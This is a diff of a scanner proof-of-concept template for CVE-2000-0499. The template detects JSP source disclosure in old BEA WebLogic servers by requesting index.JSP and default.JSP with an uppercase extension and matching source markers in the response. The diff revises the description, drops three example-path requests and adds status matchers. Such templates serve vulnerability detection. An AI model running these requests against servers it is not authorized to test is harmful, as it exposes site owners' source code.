@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "验证 BEA WebLogic 3.1.8-4.5.1 默认配置下，通过请求大写 .JSP 扩展名绕过 JSP 编译直接获取源代码"
+description = "检测 BEA WebLogic 3.1.8-4.5.1 JSP 源代码泄露漏洞（CWE-178 大小写敏感性缺陷），通过请求大写 .JSP 后缀绕过 JSP 编译引擎直接获取源代码"
 id = "POC-AVE-2000-0560"
 name = "CVE-2000-0499 PoC"
 severity = "high"
@@ -15,69 +15,13 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/examples/jsp/num/numguess.jsp"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "<%@",
-    "<%",
-    "import",
-    "java.",
-    "jsp:",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/examples/jsp/snp/snoop.jsp"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "<%@",
-    "<%",
-    "import",
-    "java.",
-    "jsp:",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/examples/jsp/dates/date.jsp"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "<%@",
-    "<%",
-    "import",
-    "java.",
-    "jsp:",
-]
-
-[[poc.requests]]
-method = "GET"
 path = "/{{BaseURL}}/index.JSP"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
@@ -86,18 +30,28 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "<%@",
     "<%",
+    "%>",
+    "java",
     "import",
-    "java.",
-    "jsp:",
+    "package",
 ]
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/default.JSP"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
@@ -106,9 +60,15 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "<%@",
     "<%",
+    "%>",
+    "java",
     "import",
-    "java.",
-    "jsp:",
+    "package",
 ]
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
